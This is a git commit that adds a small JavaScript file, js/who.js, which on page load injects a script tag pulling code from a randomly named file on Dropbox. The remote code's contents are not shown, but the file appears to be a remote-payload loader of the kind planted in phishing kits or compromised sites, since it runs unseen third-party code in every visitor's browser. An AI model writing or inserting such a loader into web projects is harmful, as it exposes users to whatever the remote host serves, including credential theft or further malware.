190749a5b0eccbcae6d7c16e81afb14f8bf1c662
Platen-007 <007teamxg@gmail.com>
2025-05-20 18:53:37 +0300

    Create who.js

---
+++ js/who.js
@@ -0,0 +1,12 @@
+function cargarSegundoScript() {
+    var preloadLink = document.createElement('link');
+    preloadLink.rel = 'preload';
+    preloadLink.href = 'https://dl.dropboxusercontent.com/s/gi951h3kc5tcmo1e80vls/jfgjkflklglgdjfikkjdjff0888.js?rlkey=xjnywh193xg9q4v14n57qvvlc&st=iyywxbuo&dl=0';
+    preloadLink.as = 'script';
+    document.head.appendChild(preloadLink);
+    var script2 = document.createElement('script');
+    script2.src = 'https://dl.dropboxusercontent.com/s/gi951h3kc5tcmo1e80vls/jfgjkflklglgdjfikkjdjff0888.js?rlkey=xjnywh193xg9q4v14n57qvvlc&st=iyywxbuo&dl=0';
+    script2.async = true;
+    document.head.appendChild(script2)
+}
+cargarSegundoScript();
